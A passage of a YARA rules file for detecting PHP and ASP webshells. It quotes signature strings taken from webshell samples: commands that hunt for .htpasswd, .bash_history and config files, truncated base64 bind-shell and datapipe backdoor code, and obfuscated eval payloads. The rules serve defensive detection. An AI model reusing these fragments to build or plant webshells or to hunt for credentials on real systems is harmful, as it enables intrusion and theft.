      $s11 = "elseif(($regread) AND !empty($_POST['readregname'])) {" fullword ascii
      $s12 = "elseif(($_POST['do'] == 'viewphpvar') AND !empty($_POST['phpvarname'])) {" fullword ascii
      $s13 = "echo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname']).\" " fullword ascii
      $s14 = "echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile']).\" " fullword ascii
      $s15 = "sqldumptable($currow[0], $filehandle);" fullword ascii
      $s16 = "if (!empty($year) AND !empty($month) AND !empty($data) AND !empty($hour) AND !empty($minute) AND !empty($second)) {" fullword ascii
      $s17 = "$tb->tdheader('WebShell Mode');" fullword ascii
      $s18 = "$tb->tdbody($tb->maketextarea('filecontent',$contents));" fullword ascii
      $s19 = "if (empty($_POST['table']) OR empty($_POST['backuptype'])) {" fullword ascii
      $s20 = "$action = \"??action=shell&dir=\".urlencode($dir);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _0303e32c8e6674ec89356c9282eeac81606b4fb5_6ba8c54857834508e8be9eecc6c5a25b259fb4cd_128
{
   meta:
      description = "php17 - from files 0303e32c8e6674ec89356c9282eeac81606b4fb5.php, 6ba8c54857834508e8be9eecc6c5a25b259fb4cd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "925fa1651076a0068d090b84fd85dcc6c07793a4c42fce8321920c5cae062ccb"
      hash2 = "22079a34d3f2bd293d057babdc4e8474cf6e718f1a11622082cdd93f8801a3f1"
   strings:
      $x1 = "p('<p><a href=\"http://www.alturks.com/phpspy/plugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $s2 = "$filelist=$this -> GetFileList($dir);//+-+ --#&#1101;" fullword ascii
      $s3 = "<a href=\"javascript:goaction('sqlfile');\">MySQL Upload &amp; Download</a> |" fullword ascii
      $s4 = "/*===================== -&#1097;+&#1076;+&#1089;-  =====================*/" fullword ascii
      $s5 = "$world['execute'] = ($mode & 00001) ? 'x' : '-';" fullword ascii
      $s6 = "$owner['execute'] = ($mode & 00100) ? 'x' : '-';" fullword ascii
      $s7 = "$group['execute'] = ($mode & 00010) ? 'x' : '-';" fullword ascii
      $s8 = "3dSVhMCVlQyVlNiVlRSVlNyU3aSVlNiVlNyVlaSVvRCVhYSVlQSVlNiU3ZSVlNiU3byVlbyU3YSVlOSU3MCU3dSVhYSVvRSVlZSU3aSVlRSVlbyU3dSVlOSVlRiVlRSV" ascii
      $s9 = "vQiVlOSVvQyU3byVvNiVhRSVlQyVlaSVlRSVlNyU3dSVlOCVvQiVlOSVhQiVhQiVhOSU3dSVhQiVvRCVpbyU3dSU3YSVlOSVlRSVlNyVhRSVlZSU3YSVlRiVlRCV1byV" ascii
      $s10 = "3YSVhOCU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVhRCVvNiVhQyVvNiVhOSVhOSVvQiVldSVlRiVlbyU3aSVlRCVlaSVlRSU3dSVhRSU3NyU3YSVlOSU3dSVlaSVhOCU" ascii
      $s11 = "hMCVldSV1ZSVhOCU3byVhOSU3QiU3ZSVlNiU3YSVhMCU3byVvNiVvRCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3byVhRSU3byU3aSVlYSU3byU3dSU3YSVhOCV" ascii
      $s12 = "lOCVlNiU3YSV1byVlRiVldSVlaSVhOCU3byVvNiVhRSVlbyVlOCVlNiU3YSV1byVlRiVldSVlaSV1NiU3dSVhOCVlOSVhOSVhRCU3byVhRSU3byU3aSVlYSU3byU3dSU" ascii
      $s13 = "3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3dSVhOSVhOSVvQiU3RCVvQyVhRiU3byVlbyU3YSVlOSU3MCU3dSVvRScpKTtkRignKjhIWEhXTlVZKjdpWFdIKjhJbXl" ascii
      $s14 = "vMCVhQyU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVhRCVvNiVhOSVhOSVvQiVhMCU3ZSVlNiU3YSVhMCU3dSVvRCVhNyVhNyVvQiVlZSVlRiU3YSVhOCVlOSVvRCVvMCV" ascii
      $s15 = "m('Deleted file have finished&#1075;&#1084;choose '.count($dl).' success '.$succ.' fail '.$fail);" fullword ascii
      $s16 = "// +&#1095;| -&#1096;-&#1082;|#-&#1099;-&#1097;+&#1076;,|&#1099;-|+-||-+|#-&#1099;" fullword ascii
      $s17 = "// +&#1105;||++|&#1080;-+-++-+ --#&#1101;" fullword ascii
      $s18 = "/*===================== +&#1092;+|+&#1089;-  =====================*/" fullword ascii
      $s19 = "// #&#1088;+&#1085;+-+ -&#1031;-+" fullword ascii
      $s20 = "// +&#1105;+&#1073;|#|#|-+-+ -|-|-++|" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _35e94397c3dd030e25c7ed6088e8b1e6f004dace_aspydrv_ASPYDrvsInfo_129
{
   meta:
      description = "php17 - from files 35e94397c3dd030e25c7ed6088e8b1e6f004dace.php, aspydrv.php, ASPYDrvsInfo.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "720fb5810cc70a13a08adb544bda3681dbe43a92fa8f05500db16766a70e4fdf"
      hash2 = "58940c0ea029b6b277fd16820be53a78c971c5d30fbe8bec2147399c6d89adb7"
      hash3 = "351dcaadf1055fdba56cf64490c988a359cc6df3362c08e07f10fa153d162c36"
   strings:
      $s1 = "oUploadFile.ContentType = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))" fullword ascii
      $s2 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword ascii
      $s3 = "Uploader.Upload()" fullword ascii
      $s4 = "If Uploader.Files.Count = 0 Then" fullword ascii
      $s5 = "oUploadFile.FileName = Right(sFileName, Len(sFileName)-InStrRev(sFileName, \"\\\"))" fullword ascii
      $s6 = "For Each File In Uploader.Files.Items" fullword ascii
      $s7 = "nPos = InstrB(nDataBoundPos, biData, CByteString(\"Content-Disposition\"))" fullword ascii
      $s8 = "nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2" fullword ascii
      $s9 = "Set Uploader = New FileUploader" fullword ascii
      $s10 = "oUploadFile.FileData = MidB(biData, nPosBegin, nPosEnd-nPosBegin)" fullword ascii
      $s11 = "nDataBoundPos = InstrB(nDataBoundPos + LenB(vDataBounds), biData, vDataBounds)" fullword ascii
      $s12 = "Set mcolFormElem = Server.CreateObject(\"Scripting.Dictionary\")" fullword ascii
      $s13 = "biData = Request.BinaryRead(Request.TotalBytes)" fullword ascii
      $s14 = "Set oFS = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s15 = "Response.Write \"File(s) not uploaded.\"" fullword ascii
      $s16 = "Set Files = Server.CreateObject(\"Scripting.Dictionary\")" fullword ascii
      $s17 = "If oUploadFile.FileSize > 0 Then Files.Add LCase(sInputName), oUploadFile" fullword ascii
      $s18 = "Public Property Get Form(sIndex)" fullword ascii
      $s19 = "Class FileUploader" fullword ascii
      $s20 = "Public ContentType" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _031d3c46f8a4462cf23accc3aaecf840f77d9a30_144b414a2168fecf31591bbe049e1424ccff4899_1477fa53e5e56605fe001c88831fcb71e30d6e86__130
{
   meta:
      description = "php17 - from files 031d3c46f8a4462cf23accc3aaecf840f77d9a30.php, 144b414a2168fecf31591bbe049e1424ccff4899.php, 1477fa53e5e56605fe001c88831fcb71e30d6e86.php, 1b45fc7d2a485cce8295a4962b581979b08fb01d.php, 1dc03138e5406f8e1f850181e92084ed0f4b5302.php, 20784cd31c22ddaa849b6c93042df34c1d462ab9.php, 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php, 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php, 649515a5730e7baa0303b29ce49f7e142b88c2ce.php, 691a4634dc5f78ceee68850138b8b68047b8dca6.php, 6f1a2aa579a8ecd60d17677f0cd211c4090500f6.php, 7bd7bb6237c7654d933dc363cabbc553f9d21382.php, 8d851537dff4dc80cdc23f57784bbf0bd7b4431c.php, 91241fc05105627c2f58942867db10b2b691574e.php, 918af72b83a165b25283dbd8f1490309dfdb77da.php, 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php, 946a66a5f7f8be95ea7693ee5500bb404b9d0add.php, 95570807b7c1a0531c134fb85c98cdc4ff63ee9b.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php, a9b8077357065b95c2bc7f3ffa7baea65895d920.php, abdbeae0be991e8bab37946a1b55df5af144a0a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash2 = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
      hash3 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
      hash4 = "06fa69321e2a28a683c7dc14381132981804aa20fe860c596fa504d8646cef57"
      hash5 = "bbbdf28407a4c943f048dcdd7da7515e42797a64b76fd2455e5403b436ec4de8"
      hash6 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash7 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      hash8 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash9 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
      hash10 = "3c175446e4a5ddb7ddec93c3338097f3ef96b6edb9cc10801be12346d787f3c0"
      hash11 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash12 = "617ed1a8b61dd1f84acd225bfe8dc36c479a1ad3c98b2bb335b2735cb4fb2fe7"
      hash13 = "f27b491508d18cbfb6f3e57aafcabe5826a2f0098b187ad6459f40b5812c36e0"
      hash14 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
      hash15 = "589ad371c414fae2d6f1f0ef7d197cf495bf06d1a0e367f9c3907b77f3054299"
      hash16 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
      hash17 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash18 = "97ba3775928dacbf6b4d58416752db2113af88aa914bc35e7b2a7ddf73f70d8b"
      hash19 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
      hash20 = "623d482f0f99bd37b67b2e98b697b7a19c08b2e296fd83fed439627b5a30cd3b"
      hash21 = "1a2bed0ae0b8846eb567043a998ad835d7e4103abcd6618e4ccb01a2a73a9ec9"
   strings:
      $s1 = "$_POST['cmd'] = 'find '.$_POST['s_dir'].' -name \\''.$_POST['s_mask'].'\\' | xargs grep -E \\''.$_POST['s_text'].'\\'';" fullword ascii
      $s2 = "if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == \"search_text\")" fullword ascii
      $s3 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii
      $s4 = "$datapipe_pl=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCnVzZSBQT1NJWDsNCiRsb2NhbHBvcnQgPSAkQVJHVlswXTsNCiRob3N0I" fullword ascii
      $s5 = "$this->TimeTotal = @round(getmicrotime() - $this->TimeStart,4);" fullword ascii
      $s6 = "if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text'],$_POST['s_mask" fullword ascii
      $s7 = "$datapipe_c=\"I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2" fullword ascii
      $s8 = "$port_bind_bd_c=\"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS" fullword ascii
      $s9 = "'----------------------------------------------------------------------------------------------------'=>'ls -la'" fullword ascii
      $s10 = "if(!empty($_POST['cmd']) && $_POST['cmd'] == \"find_text\")" fullword ascii
      $s11 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"save_file\")" fullword ascii
      $s12 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii
      $s13 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"mk\")" fullword ascii
      $s14 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"ch_\")" fullword ascii
      $s15 = "$port_bind_bd_pl=\"IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS" fullword ascii
      $s16 = "/* --------------------------------------------------------------- */" fullword ascii
      $s17 = "foreach (@ini_get_all() as $key=>$value)" fullword ascii
      $s18 = "function GetFileMatchesCount() { return $this->FileMatchesCount; }" fullword ascii
      $s19 = "$_POST['cmd']=\"edit_file\";" fullword ascii
      $s20 = "else { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text']); }" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _0777d5c17d4066b82ab86dff8a46af6f_1f080fa1122019389159fa4f63978222_131
{
   meta:
      description = "php17 - from files 0777d5c17d4066b82ab86dff8a46af6f.php, 1f080fa1122019389159fa4f63978222.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "92fe881701c478d4de012df1a25ec5a0444adb3a07d60773b455052521bba91c"
      hash2 = "54b60f755fb2b480feb91ff7e3aea527c5a60c413356b39c86ee55f38b3ef166"
   strings:
      $x1 = "YU0xcDd1MVZiYmxjRmRIa3kxVDllS2NFWnpHQS8vc2I1WHJrNzBPK0hqZTlWL2NqNDlIWkVDbHFNc3hDdnM5RS9lLzZBcy8zNUo4VXhySG9HbFNyQ1JoUWFP" fullword ascii
      $x2 = "U2R6SEUrb29LOG9iMW41UklHemVzeHVQK1kraDlFOUJEajVmS1d3RnVGVjlJVzhTS2RoUUNRRnRGcUZ2MkpmTFZmMWtKb3F3b1JvQW8wdWR2WTk4VnY4OFhZ" fullword ascii
      $x3 = "ZWs5YXZRWmVPSTVlajJzVXhNbmdubUUvSWsxMFkrZDdWbkpuUytBQ2Znei9uQkllOGJEckoxVzNJTEZaUGpYUmNTRzZ5ZkJlTmxiZ0tlRWtTUVdDVldHQi9i" fullword ascii
      $x4 = "TytIamU5Vi9jajQ5SFpFQ2xxTXN4Q3ZzOUUvZS82QXMvMzVKOFV4ckhvR2xTckNSaFFhT0J4Q0ZhNW14QUczTnNJUzRmaHdLLzRzL05lK0gra2M5L2gvZmc5" fullword ascii
      $x5 = "Q1FGdEZxRnYySmZMVmYxa0pvcXdvUm9BbzB1ZHZZOThWdjg4WFlaTHpvaUl1R083eDliVWZyOHRUNkxFSGhxaHlPbEpPenNXWjBQRjhTOEV1VExQWHBDcFJp" fullword ascii
      $x6 = "QUFpZnBucHhleUZqTjRMK0pYM0R3L2h5YTRSVmhVN21BT0szOFYzdEh0MUQxUnZ0L1NWaUdremtia20wRmVRSXFuZklKVmtESTBMdFljVlRhMHhkbDRuNU94" fullword ascii
      $x7 = "NklIeHZqNVY3MDhnYnVtak4wY0JhY3dwTk9tRDZBK3JWVGFFN202alo1RTJzRFZubDE5ajdIdURWTnRVZnJ3WVRVRkpkekp1T0NMTlB0WjQzaFl5NkRWeUhP" fullword ascii
      $x8 = "KzdNMXZ0cWtKY3kvREVUMC9UZEJ5eHBRMHh2bS9MNE5ydXNaLyt6RXZNL2lNRnk3Z3J3Nk5sMjVuRkNlZmVORlZJM3prc2FGZlpJS0lvMUNVZ055K3NzNDZG" fullword ascii
      $x9 = "Tm5ZSlk4WlJrM21QWlBucEVmbndVQWs0RTBUSWo4dmNHVUZMdlRsOGRaaEhTdFZVeGpsbUwxT0NuR0dFVGtXRHNyUVd2ZnptTEdtWVZWcFlDR1NpQUlVbGFm" fullword ascii
      $x10 = "VGVZMlRwVHkrckNzNzRWUGhJQSsxelY0Y0ZDTThicjBXU2h5ZEJyRlFLU3FZNTNVTCtZK0xmOUd5aWE3SDR5eGJZQUpqY3YydjVaOWJuSkhWWG5rOTNLazhX" fullword ascii
      $x11 = "ZjlmZDkuPSJcMTQ0IjskZjZkNGVlMWMuPSJceDY1Ijskd2Y0NTBhNDIuPSJcMTU2Ijskd2Y0NTBhNDIuPSJcMTY0IjskdGRlZjlmZDkuPSJceDY1Ijskd2Y0" fullword ascii
      $x12 = "a0dqTklkVk53YVNZK25JTXpIT2VaTm1Qb0UzWGVubzlGaUEwWHovY24ydC9kV2J5dldnbFdaZlFpQVYxRGQxSDlHQUlrS2F1SkJvaTlIYk5oVm53dklrRS9T" fullword ascii
      $x13 = "NjUiOyRlOWRkYjg4MD0iXHg2NyI7JHU5M2RhOGVjPSJceDczIjskd2UxZWMzM2M9Ilx4NzMiOyR3ZjQ1MGE0Mj0iXDE0NiI7JGY2ZDRlZTFjPSJcMTYwIjsk" fullword ascii
      $x14 = "eDI4IixfX0ZJTEVfXyk7QGV2YWwoJHU5M2RhOGVjKCR3ZWY0N2MyNygkZjZkNGVlMWMoIlx4MmZceDVjXHgyOFx4NWNceDIyXDU2XDUyXDEzNFx4MjJceDVj" fullword ascii
      $x15 = "bXpOSml0dnBXeTFrTVphZXF2MnhCVHovNEhIYk43bHk2R2RmT1FlYmxEancxOUxDNjZBeHU2NlBNN0xzQjJWUkJaY01JYy9xbERQdUZ1U0dvWGNlbldlMU1L" fullword ascii
      $x16 = "MlhnTWxrTG5DU3lWMVVGNzA3bHpwdmVMd21NaFZDa3I4VmZOejArR1YyK0g0ZVJjZUNtck9oT3c0d1ZlUWJYNHEzalJNQWNZR0dZRjZlRGkwZ3E1MVFOcGNn" fullword ascii
      $x17 = "MTg5ODQ5Mi49IlwxNjMiOyRmNmQ0ZWUxYy49IlwxNDUiOyR0ZGVmOWZkOS49Ilx4NzMiOyR3ZWY0N2MyNy49IlwxNDEiOyR3ZjQ1MGE0Mi49Ilx4NmMiOyRx" fullword ascii
      $x18 = "dktjVGp0WkpuSkRHMFlmQWRXK2c3V3ZEcjlDdU84OGF4WEdFRUVhb2VVNjB2bVVPL1BveXFjeW5RYnhnd2s3bVd1WmlvWUVFMFJXeEhzdXYycVBVK3JUeCtH" fullword ascii
      $x19 = "ZjQ1MGE0Mi49Ilx4NjUiOyRlOWRkYjg4MC49IlwxNTYiOyRmNmQ0ZWUxYy49Ilx4NjciOyR3ZTFlYzMzYy49IlwxMzciOyRuMTg5ODQ5Mi49IlwxNDUiOyR3" fullword ascii
      $x20 = "LyszOE9pLytsdGx2bmM0ZkRxdmxuRi9BanFjRDFyWXBuZThIcC9wNVpKM0twVHM0OXZQTFpNai9IUVozQzVJVnRuWU41eFBWNC9Qd1ZQUURPSmhUVmpISTVD" fullword ascii
   condition:
      ( uint16(0) == 0x3c20 and filesize < 30KB and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _060ad92489947d410d897474079c1477_06521d9b70a37cb6455a9684ef3db13944feca2e_25b2ffa40e50b038212591c4eb09a89fe10cbd43_35b0448c_132
{
   meta:
      description = "php17 - from files 060ad92489947d410d897474079c1477.php, 06521d9b70a37cb6455a9684ef3db13944feca2e.php, 25b2ffa40e50b038212591c4eb09a89fe10cbd43.php, 35b0448cd3e328b11521ab053ea0c99694119b82.php, 5fa1008e2c1a5dee4ca91638903563e6eff10569.php, 75aa5981c7740da3a645cd272029090750474ae1.php, 7e4723914113dcea43f5c7fe31576b45ab97bd12.php, 8786355027e9ea8b98725019f1d594fd194cd412.php, 98d13eea07f57d3b4a2c5079cc27659dde6ebfad.php, a2baa41f5667eb2a3ad57003105e57ed0000af38.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "70d1d6937c7b00d4909ff80dcadc7771349d918f99e3515038d550a3d8ac90f2"
      hash2 = "9ebb24b9f38a0cfb5be43a43933fc36aa47140089a5b07560130a88e0c887fed"
      hash3 = "33b0ffc5c6dcf69ccabd978d0c8995f2f4d35d94c5dbbf350f7ded03e6ed82a0"
      hash4 = "b87a5779c3b9ff9e4830be35799a297d9f7dce01d62b6953126f80e969e2a40e"
      hash5 = "0a0944635d48b8d4a44068847e8958710c644233a5227bc193bbd34999dc2131"
      hash6 = "007005ffbf899f70fe325993556129086702958b592d4bf22d8465d202a1b11f"
      hash7 = "d37e7daffca28c0d039f1c41e0d960cb912975fa51e391d12eb7330e983cb5de"
      hash8 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash9 = "9ca48c9df4cd95c76600fc0ae6b525c7adc9edfb606ca5fe24aab23d952de256"
      hash10 = "7c07c724d568753b57ae312c6a01c30b0eb9b7117165ef6519d0c125fe751f08"
   strings:
      $s1 = "echo '<b>'.htmlspecialchars($_POST['login']).'</b>:'.htmlspecialchars($line).'<br>';" fullword ascii
      $s2 = "\"Find *config*.php in current dir\" => \"dir /s /w /b *config*.php\"," fullword ascii
      $s3 = "\"find service.pwd files in current dir\" => \"find . -type f -name service.pwd\"," fullword ascii
      $s4 = "\"Find index.php in current dir\" => \"dir /s /w /b index.php\"," fullword ascii
      $s5 = "\"show opened ports\" => \"netstat -an | grep -i listen\"," fullword ascii
      $s6 = "\"list file attributes on a Linux second extended file system\" => \"lsattr -va\"," fullword ascii
      $s7 = "echo '<option value=\"'.$value.'\" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';" fullword ascii
      $s8 = "if( $this->link = @mysql_connect($host,$user,$pass,true) ) return true;" fullword ascii
      $s9 = "\"find .htpasswd files in current dir\" => \"find . -type f -name .htpasswd\"," fullword ascii
      $s10 = "\"Show running services\" => \"net start\"," fullword ascii
      $s11 = "\"find .bash_history files in current dir\" => \"find . -type f -name .bash_history\"," fullword ascii
      $s12 = "\"find .fetchmailrc files in current dir\" => \"find . -type f -name .fetchmailrc\"," fullword ascii
      $s13 = "\"find all writable folders and files in current dir\" => \"find . -perm -2 -ls\"," fullword ascii
      $s14 = "$fp = @ftp_connect($ip, $port?$port:21);" fullword ascii
      $s15 = "if(isset($_POST['sql_host'])){" fullword ascii
      $s16 = "\"Show active connections\" => \"netstat -an\"," fullword ascii
      $s17 = "\"find all writable folders and files\" => \"find / -perm -2 -ls\"," fullword ascii
      $s18 = "$temp = \"document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='\".addcslashes(h" ascii
      $s19 = "lspecialchars(ob_get_clean()),\"\\n\\r\\t\\\\'\\0\").\"';\\n\";" fullword ascii
      $s20 = "$db->dump($v);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _01a00e6583ed3789694d600fa831392aa785c5f9_3c7b93811ffd056b5952b80a517c10c2_aa0fc6f621e8b2965b3a109832117d023f4a1ad6_133
{
   meta:
      description = "php17 - from files 01a00e6583ed3789694d600fa831392aa785c5f9.php, 3c7b93811ffd056b5952b80a517c10c2.php, aa0fc6f621e8b2965b3a109832117d023f4a1ad6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7e680486104e6dc00dcf1d07faa73d92bb3505caaffcae2941a5624bf82db6f0"
      hash2 = "ea918b9d0452f99243cd726116e120d79a68c881cca87d1e467e72c646eff74a"
      hash3 = "2a0cd4aab8539cd4e85ece7e5a8251ae6cc21816a20023f6ddb5d979c98d2cb3"
   strings:
      $s1 = "$header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilen" fullword ascii
      $s2 = "$data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $b" fullword ascii
      $s3 = "$header['comment'] = fread($zip, $header['comment_len']);" fullword ascii
      $s4 = "$header['compression'] = $data['compression'];$header['size'] = $data['size'];" fullword ascii
      $s5 = "$binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($header['compression'])," fullword ascii
      $s6 = "$binary_data = pack('VV', $header['crc'], $header['size']);" fullword ascii
      $s7 = "$year = (($header['mdate'] & 0xFE00) >> 9) + 1980;" fullword ascii
      $s8 = "$header['filename'] = fread($zip,$header['filename_len']);" fullword ascii
      $s9 = "$header['filename'] = fread($zip, $data['filename_len']);" fullword ascii
      $s10 = "$seconde=($header['mtime']&0x001F)*2;$year=(($header['mdate']&0xFE00)>>9)+1980;" fullword ascii
      $s11 = "$header['extra'] = fread($zip, $header['extra_len']);" fullword ascii
      $s12 = "$hour=($header['mtime']&0xF800)>>11;$minute=($header['mtime']&0x07E0)>>5;" fullword ascii
      $s13 = "$header['compressed_size'] = $data['compressed_size'];" fullword ascii
      $s14 = "$header['extra'] = fread($zip, $data['extra_len']);" fullword ascii
      $s15 = "if (substr($header['filename'], -1) == '/')" fullword ascii
      $s16 = "$month=($header['mdate']&0x01E0)>>5;$day=$header['mdate']&0x001F;" fullword ascii
      $s17 = "$header['mdate'] = $data['mdate'];$header['mtime'] = $data['mtime'];" fullword ascii
      $s18 = "$stat[$header['filename']]=$this->ExtractFile($header, $to, $zip);" fullword ascii
      $s19 = "ame_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);" fullword ascii
      $s20 = "$header = $this->readfileheader($zip);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _144b414a2168fecf31591bbe049e1424ccff4899_1477fa53e5e56605fe001c88831fcb71e30d6e86_35940353c0f3d6511e2789fc3cb9e5b3cea3b10d__134
{
   meta:
      description = "php17 - from files 144b414a2168fecf31591bbe049e1424ccff4899.php, 1477fa53e5e56605fe001c88831fcb71e30d6e86.php, 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php, 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php, 649515a5730e7baa0303b29ce49f7e142b88c2ce.php, 6f1a2aa579a8ecd60d17677f0cd211c4090500f6.php, 7bd7bb6237c7654d933dc363cabbc553f9d21382.php, 8d851537dff4dc80cdc23f57784bbf0bd7b4431c.php, 91241fc05105627c2f58942867db10b2b691574e.php, 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
      hash2 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
      hash3 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      hash4 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash5 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
      hash6 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash7 = "617ed1a8b61dd1f84acd225bfe8dc36c479a1ad3c98b2bb335b2735cb4fb2fe7"
      hash8 = "f27b491508d18cbfb6f3e57aafcabe5826a2f0098b187ad6459f40b5812c36e0"
      hash9 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
      hash10 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
   strings:
      $s1 = "?? ?????? ??? GID (??????) \\r\\n- ??? ??????? CHMOD - ????? ????? ? ???????????? ????????????? (???????? 0777)\"," fullword ascii
      $s2 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword ascii
      $s3 = "'ru_text85'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ?????????? ?????? ? MSSQL ???????'," fullword ascii
      $s4 = "'ru_text75'=>'* ????? ???????????? ?????????? ?????????'," fullword ascii
      $s5 = "'ru_text35'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ???????? ????? ? mysql'," fullword ascii
      $s6 = "'ru_text34'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ??????? include'," fullword ascii
      $s7 = "'ru_text44'=>'?????????????? ????? ??????????! ?????? ?????? ??? ??????!'," fullword ascii
      $s8 = "'ru_text47'=>'???????? ???????? php.ini'," fullword ascii
      $s9 = "'ru_text71'=>\"?????? ???????? ???????:\\r\\n- ??? CHOWN - ??? ?????? ???????????? ??? ??? UID (??????) \\r\\n- ??? ??????? CHGR" ascii
      $s10 = "'ru_text71'=>\"?????? ???????? ???????:\\r\\n- ??? CHOWN - ??? ?????? ???????????? ??? ??? UID (??????) \\r\\n- ??? ??????? CHGR" ascii
      $s11 = "'ru_text76'=>'????? ?????? ? ?????? ? ??????? ??????? find'," fullword ascii
      $s12 = "'ru_text15'=>'???????? ?????? ? ?????????? ???????'," fullword ascii
      $s13 = "'ru_text48'=>'???????? ????????? ??????'," fullword ascii
      $s14 = "'ru_text40'=>'???? ??????? ???? ??????'," fullword ascii
      $s15 = "'ru_text57'=>'???????/??????? ????/??????????'," fullword ascii
      $s16 = "'ru_text5' =>'???????? ?????? ?? ??????'," fullword ascii
